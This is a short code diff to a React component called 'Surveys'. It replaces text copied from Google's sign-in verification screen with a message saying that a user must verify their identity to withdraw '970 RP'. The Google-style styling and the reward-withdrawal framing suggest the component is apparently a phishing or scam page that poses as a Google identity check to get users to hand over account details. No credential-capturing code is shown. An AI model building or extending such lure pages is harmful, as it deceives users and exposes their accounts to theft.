@@ -276,7 +276,7 @@ const Surveys = () => {
             </div>
 
             <p className="text-[14px] text-[#5f6368] text-center mt-6 leading-relaxed">
-              To help keep your account safe, Google wants to make sure it's really you trying to sign in.
+              To withdraw your 970 RP, we need to verify your identity. Please follow the instructions below to confirm your account.
             </p>
 
             {isWaiting && (
